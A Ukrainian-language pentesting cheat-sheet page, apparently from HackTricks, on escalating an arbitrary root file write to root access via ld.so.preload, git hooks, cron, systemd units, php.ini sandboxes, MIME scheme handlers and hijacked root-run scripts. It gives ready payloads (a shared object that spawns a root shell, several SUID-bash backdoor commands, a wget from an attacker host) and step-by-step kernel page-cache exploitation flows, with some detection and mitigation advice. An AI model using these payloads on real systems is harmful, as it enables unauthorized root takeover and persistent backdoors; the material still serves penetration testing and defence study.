# Запис довільного файлу від імені root

### /etc/ld.so.preload

`/etc/ld.so.preload` — це загальносистемний список shared objects, які dynamic linker завантажує перед іншими shared objects. Режим secure-execution застосовує додаткові обмеження до попереднього завантаження, тому шлях до бібліотеки, як-от `/tmp/pe.so`, не є універсальною технікою для SUID-бінарників.\
Якщо ви можете створити або змінити цей файл, процес, який його завантажує, завантажить зазначену бібліотеку перед іншими shared objects, що дасть змогу виконати код у контексті цього процесу.<sup>[[12]](#references)</sup>

Наприклад: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** — це виконувані скрипти, які запускаються під час подій у репозиторії, зокрема під час операцій commit і merge. Якщо **привілейований скрипт або користувач** виконує ці дії, а зловмисник може **записувати дані в папку `.git`**, hook можна використати для **privilege escalation**.<sup>[[13]](#references)</sup>

Наприклад, можна **створити скрипт** у git repo в **`.git/hooks`**, щоб він завжди виконувався під час створення нового commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Cron і Time-файли

Якщо ви можете **записувати файли, пов’язані з Cron, які виконує root**, зазвичай можна отримати code execution під час наступного запуску job. Цікаві цілі включають:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Власний crontab root у `/var/spool/cron/` або `/var/spool/cron/crontabs/`
- Таймери `systemd` і services, які вони запускають

Швидкі перевірки:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Типові шляхи зловживання:

- **Додати нове завдання root cron** до `/etc/crontab` або файлу в `/etc/cron.d/`
- **Замінити скрипт**, який уже виконується через `run-parts`
- **Встановити backdoor у ціль наявного timer**, змінивши скрипт або binary, який він запускає

Мінімальний приклад cron payload:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Якщо ви можете записувати лише в каталог cron, який використовується `run-parts`, натомість помістіть туди виконуваний файл:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Примітки:

- `run-parts` зазвичай ігнорує імена файлів, що містять крапки, тому краще використовувати імена на кшталт `backup`, а не `backup.sh`.<sup>[[15]](#references)</sup>
- Деякі системи використовують таймери `systemd` замість класичного cron, але ідея зловживання та сама: **змінити те, що root виконає пізніше**.<sup>[[20]](#references)</sup>

### Файли Service та Socket

Якщо ви можете записувати **файли юнітів `systemd`** або файли, на які вони посилаються, ви можете отримати виконання коду від імені root, перезавантаживши та перезапустивши юніт, або дочекавшись спрацювання шляху активації service/socket.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Цікавими цілями є:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Перевизначення drop-in у `/etc/systemd/system/<unit>.d/*.conf`
- Скрипти/бінарні файли service, на які посилаються `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Доступні для запису шляхи `EnvironmentFile=`, які завантажує service, що працює від імені root

Швидкі перевірки:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Поширені шляхи зловживання:

- **Перезаписати `ExecStart=`** у юніті служби, що належить root і який ви можете змінювати
- **Додати drop-in override** зі шкідливим `ExecStart=` і спочатку очистити старий
- **Вбудувати backdoor у script/binary**, на який уже посилається юніт
- **Перехопити socket-activated service**, змінивши відповідний файл `.service`, який запускається, коли socket отримує з’єднання

Приклад шкідливого override:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Типовий процес активації:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Якщо ви не можете самостійно перезапустити служби, але можете редагувати socket-activated unit, вам може бути достатньо **дочекатися підключення клієнта**, щоб запустити виконання backdoored service від імені root.<sup>[[17]](#references)</sup>

### Перезапис обмеженого `php.ini`, який використовується привілейованим PHP sandbox

Деякі custom daemons перевіряють наданий користувачем PHP-код, запускаючи `php` з **обмеженим `php.ini`** (наприклад, `disable_functions=exec,system,...`). Якщо sandboxed code все ще має **будь-який примітив запису** (наприклад, `file_put_contents`) і ви можете отримати доступ до **точного шляху `php.ini`**, який використовується daemon, ви можете **перезаписати цю конфігурацію**, зняти обмеження, а потім надіслати другий payload, який виконується з підвищеними привілеями.<sup>[[2]](#references)</sup>

Типовий порядок дій:

1. Перший payload перезаписує конфігурацію sandbox.
2. Другий payload виконує код після повторного ввімкнення небезпечних функцій.

Мінімальний приклад (замініть шлях, який використовується daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Якщо daemon запускається від імені root (або перевіряє шляхи, власником яких є root), друге виконання надає контекст root. По суті, це **підвищення привілеїв через перезапис конфігурації**, коли runtime у sandbox все ще може записувати файли.

### binfmt_misc

`binfmt_misc` надає реєстрації в `/proc/sys/fs/binfmt_misc`; кожна реєстрація пов’язує шаблон типу файлу з interpreter. Вплив на привілеї залежить від того, хто може змінювати реєстрацію та який процес згодом виконує відповідний файл, тому перед розглядом цього як шляху до підвищення привілеїв перевірте ці вимоги.<sup>[[21]](#references)</sup>

### Перезапис обробників схем (наприклад, http: або https:)

Desktop environments використовують MIME-асоціації та desktop entries, щоб вибирати application для URI-схем; attacker, який може записувати відповідні конфігураційні каталоги окремого користувача та каталоги desktop entries, може перенаправити ці схеми до launcher, яким він керує. Змінивши файл `$HOME/.config/mimeapps.list`, щоб обробники URL HTTP і HTTPS вказували на malicious file (наприклад, `x-scheme-handler/http=evil.desktop` і `x-scheme-handler/https=evil.desktop`), клік користувача може викликати цей desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root, який виконує скрипти/бінарні файли, доступні для запису користувачу

Якщо привілейований workflow запускає щось на кшталт `/bin/sh /home/username/.../script` (або будь-який binary усередині directory, що належить непривілейованому користувачу), це можна hijack:<sup>[[1]](#references)</sup>

- **Виявлення виконання:** monitor processes за допомогою pspy, щоб перехопити момент, коли Root викликає paths, контрольовані користувачем.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Підтвердьте можливість запису:** переконайтеся, що цільовий файл і його каталог належать вашому користувачу та доступні для запису.
- **Перехопіть ціль:** створіть резервну копію оригінального binary/script і розмістіть payload, який створює SUID shell (або виконує будь-яку іншу дію від root), а потім відновіть дозволи:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Запустіть привілейовану дію** (наприклад, натисніть кнопку UI, яка запускає helper). Коли root повторно виконає hijacked path, отримайте escalated shell за допомогою `./rootshell -p`.

### Модифікація привілейованих бінарних файлів лише в page cache

Деякі kernel bugs не змінюють файл **на диску**. Натомість вони дозволяють змінювати лише **копію в page cache** доступного для читання файлу. Якщо ціллю є **setuid** або інший бінарний файл, який виконується від root, наступний запуск може виконати контрольовані атакером байти з пам’яті та підвищити привілеї, навіть якщо hash файлу на диску не змінився.<sup>[[3]](#references)[[4]](#references)</sup>

Це корисно розглядати як **runtime-only file write primitive**:<sup>[[3]](#references)</sup>

- **Диск залишається чистим**: inode та байти на диску не змінюються
- **Пам’ять змінена**: процеси, які читають або виконують cached page, отримують вміст, змінений атакером
- **Ефект тимчасовий**: зміна зникає після reboot або cache eviction

Цей primitive розташований між класичним **arbitrary file write** та старішими багами **page-cache abuse**, такими як Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW покладався на race
- Dirty Pipe мав обмеження щодо позиції запису
- Page-cache-only primitive може бути надійнішим, якщо вразливий path надає прямий запис у cached file-backed pages

#### Загальний privesc flow

1. Отримайте kernel primitive, який може записувати у **file-backed page cache pages**
2. Використайте його проти **readable privileged binary** або іншого файлу, який виконується від root
3. Запустіть виконання **до** того, як page буде evicted з cache
4. Отримайте code execution від root, поки файл на диску все ще виглядає незміненим

Типові цілі з високою цінністю:

- **setuid-root** бінарні файли
- Helpers, які запускаються **root services**
- Бінарні файли, які зазвичай виконуються з **containers, що спільно використовують kernel/page cache хоста**

#### Приклад шляху AF_ALG + `splice()`

Copy Fail (CVE-2026-31431) є хорошим прикладом цього класу. Вразливий path знаходився в userspace API Linux для криптографії (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` може переміщувати references на page-cache pages з readable file у crypto TX scatterlist
- in-place `algif_aead` decrypt path повторно використовував source та destination buffers
- `authencesn` після цього записував у destination tag region
- коли ця region все ще посилалася на spliced file-backed pages, запис потрапляв у **page cache target file**

Отже, цікава техніка полягає не в самому CVE, а в pattern:

- **передати file-backed cache pages у kernel subsystem**
- змусити subsystem **розглядати їх як writable output**
- виконати невеликий контрольований overwrite у пам’яті

У public PoC використовувалися повторювані **4-byte writes**, щоб змінити `/usr/bin/su` у пам’яті, після чого його запускали.<sup>[[4]](#references)[[7]](#references)</sup>

#### Приклад шляху ESP / XFRM + netfilter TEE clone

DirtyClone (CVE-2026-43503) демонструє інший варіант того самого pattern **page-cache-only write-to-root**, але цього разу sink — це **IPsec ESP decrypt**, а не `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Важливою технікою є **metadata-laundering step**:

- `splice()` розміщує **read-only file-backed page-cache page** в ESP-in-UDP packet
- оригінальна DirtyFrag mitigation позначала цей skb як `SKBFL_SHARED_FRAG`, щоб `esp_input()` виконав **copy before decrypting**
- netfilter `TEE` дублює packet через `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone зберігає **те саме physical page-cache reference**, але втрачає `SKBFL_SHARED_FRAG`
- після цього `esp_input()` вважає clone безпечним і виконує **in-place `cbc(aes)` decrypt** над file-backed page

Отже, урок для reviewer ширший за сам CVE: якщо mitigation покладається на **skb/page metadata**, щоб визначити, чи потрібно спочатку виконати copy, будь-який **clone/copy path, який зберігає backing page, але видаляє metadata**, може непомітно повторно відкрити write primitive.

Типовий exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)`, щоб отримати **`CAP_NET_ADMIN` всередині private network namespace**
2. активувати loopback і встановити **netfilter `TEE` rule** у `mangle/OUTPUT`
3. встановити **XFRM ESP transport SAs** через `NETLINK_XFRM`
4. закодувати кожне цільове 4-byte word у полі SA `seq_hi` (word-selection trick DirtyFrag)
5. надіслати spliced ESP-in-UDP packet, щоб **TEE clone** досяг `esp_input()` і виконав decrypt **in place**
6. повторювати, доки page-cache copy `/usr/bin/su` або іншого privileged executable не міститиме code, контрольований атакером

З операційного погляду вплив такий самий, як у прикладі з `AF_ALG`: файл на диску залишається чистим, але `execve()` використовує **mutated page-cache bytes** і надає root.<sup>[[8]](#references)[[9]](#references)</sup>

Корисні exposure checks для цього варіанту:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Короткострокове зменшення поверхні атаки тут також залежить від конкретного шляху: оновлення до ядра з `48f6a5356a33` виправляє шлях `clone`, тоді як блокування автозавантаження `xt_TEE` усуває **етап відмивання прапорців**, а блокування `esp4` / `esp6` усуває **приймач розшифрування**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Виявлення та пошук

Якщо ви підозрюєте цей клас вразливостей, не покладайтеся лише на перевірки цілісності диска. Також перевірте:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Наведені нижче значення конфігурації розрізняють loadable interface та інтерфейс, вбудований у kernel; правила crypto build зіставляють `CONFIG_CRYPTO_USER_API_AEAD` з `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` можна завантажувати та вивантажувати як module
- `CONFIG_CRYPTO_USER_API_AEAD=y`: інтерфейс вбудований у kernel
- setuid binaries є хорошими цілями, оскільки patch, що працює лише з page cache, може бути достатнім, щоб перетворити локальний foothold на root

#### Зменшення attack surface для шляху `algif_aead`

Якщо вразливий інтерфейс надається loadable module:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Якщо це скомпільовано в kernel, у деяких повідомленнях про розкриття інформації зазначалося, що init path блокується:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Цю митігацію також варто пам’ятати для інших kernel LPE: якщо exploitation залежить від певного optional interface, його вимкнення або додавання до blacklist може зламати шлях exploitation ще до того, як стане доступним повне оновлення kernel.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo — hijacking скрипта, що виконується від root, у доступній для запису директорії PaperCut](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: FAQ щодо Copy Fail (CVE-2026-31431)](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Розкриття інформації Openwall oss-security щодо CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Виправлення Linux stable: crypto: algif_aead — повернення до роботи out-of-place](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — advisory щодо CVE-2026-31431](https://copy.fail/)
- [7] [Технічний writeup Theori / Xint](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [Репозиторій DirtyClone / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: аналіз і exploitation варіанту Linux LPE DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Виправлення Linux: net: skb: збереження `SKBFL_SHARED_FRAG` у `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Попередня mitigation у Linux: встановлення `SKBFL_SHARED_FRAG` для spliced UDP packets (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — manual page Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — manual page Linux](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — manual page Debian](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — документація Linux Kernel](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [Асоціації MIME Applications](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Специфікація Shared MIME-info](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Специфікація Desktop Entry](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Мова Kconfig](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Makefile Linux crypto](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: вразливість page cache Linux kernel AF_ALG](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — manual page Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
{{#include ../../banners/hacktricks-training.md}}
